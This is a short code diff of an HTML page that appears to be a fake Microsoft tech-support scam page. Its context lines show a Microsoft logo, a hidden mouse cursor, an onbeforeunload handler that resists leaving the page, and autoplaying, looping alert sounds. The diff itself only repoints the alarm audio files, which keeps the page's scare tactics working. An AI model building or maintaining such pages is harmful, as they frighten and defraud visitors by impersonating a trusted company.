@@ -426,7 +426,7 @@ visibility: hidden;
 </head>
 <body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;" onclick="playSound()">
 <audio id="beeppeep" autoplay="">
-    <source src="/audio1.mp3" type="audio/mpeg">
+    <source src="audio1.mp3" type="audio/mpeg">
 </audio>
 <div class="bg" style="cursor:none;">
     <div class="bgimg" style="top: 0px;"><img src="bg1.jpg" alt="" width="100%"></div>
@@ -613,7 +613,7 @@ margin-top: 8px; text-align: center;"><img src="microsoft.png" class="logo12"> M
     </div>
 </div>
 <audio id="beep" loop="">
-  <source src="_Fm7-alert.mp3" type="audio/mpeg">
+  <source src="audio1.mp3" type="audio/mpeg">
 </audio>
 
 
